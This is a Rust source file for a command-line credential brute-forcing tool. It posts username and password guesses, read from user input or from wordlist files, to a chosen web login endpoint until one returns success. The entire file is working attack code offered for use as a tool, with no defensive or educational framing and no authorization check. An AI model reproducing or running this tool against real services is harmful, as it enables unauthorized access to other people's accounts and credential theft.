use std::io::{self, BufRead};
use std::fs::File;
use std::io::Write;
use reqwest::blocking::Client;
//use std::time::Instant;

fn handle_mode() -> (i32, String, String) {
    println!("
 ____             _                           
| __ ) _ __ _   _| |_ ___                     
|  _ \\| '__| | | | __/ _ \\                    
| |_) | |  | |_| | ||  __/                    
|____/|_|   \\__,_|\\__\\___|____            _   
|  ___|__  _ __ ___ ___  |  _ \\ _   _ ___| |_ 
| |_ / _ \\| '__/ __/ _ \\ | |_) | | | / __| __|
|  _| (_) | | | (_|  __/ |  _ <| |_| \\__ \\ |_ 
|_|  \\___/|_|  \\___\\___| |_| \\_\\\\__,_|___/\\__|       

-----------------------------------------------------------------------
A simple brute force script in Rust by EdoPan.
Insert the URL and the POST endpoint.
Three modes are provided: Single, Fixed and Advanced.
Single: Insert manually username and password.
Fixed: Insert a username and a password.txt file that will be iterated.
Advanced: Insert a username.txt file and a password.txt file 
both files will be iterated.
-----------------------------------------------------------------------
    ");
    print!("Insert URL: ");
    io::stdout().flush().unwrap();
    let mut u: String = String::new();
    io::stdin()
        .read_line(&mut u).expect("Failed to read URL");
    print!("Insert endpoint: ");
    io::stdout().flush().unwrap();
    let mut e: String = String::new();
    io::stdin()
        .read_line(&mut e).expect("Failed to read URL");
    println!("Choose mode: Single (1), Fixed (2), Advanced (3)");
    print!("Choose mode: ");
    io::stdout().flush().unwrap();
    let mut m = String::new();
    io::stdin()
        .read_line(&mut m).expect("Failed to read mode");
    let mode: i32 = m.to_string().replace("\n", "").parse().unwrap();
    let url: String = u.replace("\n", "");
    let endpoint: String = e.replace("\n", "");
    return (mode, url, endpoint);
}

fn handle_single_mode(address: String, client: Client) {
    loop {
        print!("Insert username: ");
        io::stdout().flush().unwrap();
        let mut username = String::new();
        io::stdin()
            .read_line(&mut username).expect("Failed to read username");
        print!("Insert password: ");
        io::stdout().flush().unwrap();
        let mut password = String::new();
        io::stdin()
            .read_line(&mut password).expect("Failed to read password");
        let response = make_request(address.clone(), client.clone(), username.replace("\n", ""), password.replace("\n", ""));
        if response == true {
            break;
        }
    }
}

fn handle_fixed_mode(address: String, client: Client) {
    print!("Insert username: ");
    io::stdout().flush().unwrap();
    let mut username = String::new();
    io::stdin()
        .read_line(&mut username).expect("Failed to read username");
    print!("Insert passwords file name: ");
    io::stdout().flush().unwrap();
    let mut f = String::new();
    io::stdin()
        .read_line(&mut f).expect("Failed to read file name");
    let file_name = f.replace("\n", "");
    let path = String::from("./data/".to_owned() + &file_name);
    let file = File::open(path).unwrap();
    let lines = io::BufReader::new(file).lines();
    //let mut counter: i32 = 0;
    //let now = Instant::now();
    for line in lines.flatten() {
        let password = line.replace("\n", "");
        let response = make_request(address.clone(), client.clone(), username.clone().replace("\n", ""), password);
        //let elapsed_time = now.elapsed();
        //counter += 1;
        //println!("Request #{} time elapsed: {}", counter, elapsed_time.as_millis());
        if response == true {
            break;
        }
    }
}

fn handle_advanced_mode(address: String, client: Client) {
    print!("Insert users file name: ");
    io::stdout().flush().unwrap();
    let mut f_users = String::new();
    io::stdin()
        .read_line(&mut f_users).expect("Failed to read file name");
    let users_file_name = f_users.replace("\n", "");
    let users_path = String::from("./data/".to_owned() + &users_file_name);
    print!("Insert passwords file name: ");
    io::stdout().flush().unwrap();
    let mut f_passwords = String::new();
    io::stdin()
        .read_line(&mut f_passwords).expect("Failed to read file name");
    let passwords_file_name = f_passwords.replace("\n", "");
    let passwords_path = String::from("./data/".to_owned() + &passwords_file_name);
    let users_file = File::open(users_path).unwrap();
    let users = io::BufReader::new(users_file).lines();
    let passwords_file = File::open(passwords_path).unwrap();
    let passwords_buffer: io::Lines<io::BufReader<File>> = io::BufReader::new(passwords_file).lines();
    let mut password_list: Vec<String> = Vec::new();
    //let now = Instant::now();
    for password in passwords_buffer.flatten() {
        password_list.push(password.replace("\n", ""));
    }
    //let elapsed_time = now.elapsed();
    //println!("Time elapsed to read the file: {}", elapsed_time.as_millis());
    'outer: for u in users.flatten() {
        let username: String = u.replace("\n", "");
        //let mut counter: i32 = 0;
        //let now = Instant::now();
        for password in password_list.clone() {
            let response = make_request(address.clone(), client.clone(), username.clone().replace("\n", ""), password);
            //let elapsed_time = now.elapsed();
            //counter += 1;
            //println!("Request #{} time elapsed: {}", counter, elapsed_time.as_millis());
            if response == true {
                break 'outer;
            }
        }
    }
}

fn get_client(url: String) -> Client {
    let client: Client = Client::builder().cookie_store(true).build().unwrap();
    let _ = client.get(url.clone()).send().expect("Unable to make GET request");
    return client;
}

fn make_request(address: String, client: Client, u: String, p: String) -> bool {
    let result = client.post(address)
    .body("{\"username\": \"".to_string() + &u + "\", \"password\": \"" + &p + "\"}")
    .send();
    //println!("{:#?}", result);
    if result.is_ok() && result.unwrap().status().is_success() {
        println!("Credentials found: {}, {}", u, p);
        return true;
    } else {
        return false;
    };
}

fn main() {
    let result = handle_mode();
    let url = result.1;
    let endpoint = result.2;
    let address = url.clone() + &endpoint;
    let client = get_client(url);
    match result.0 {
        1 => handle_single_mode(address, client),
        2 => handle_fixed_mode(address, client),
        3 => handle_advanced_mode(address, client),
        _ => ()
    }
}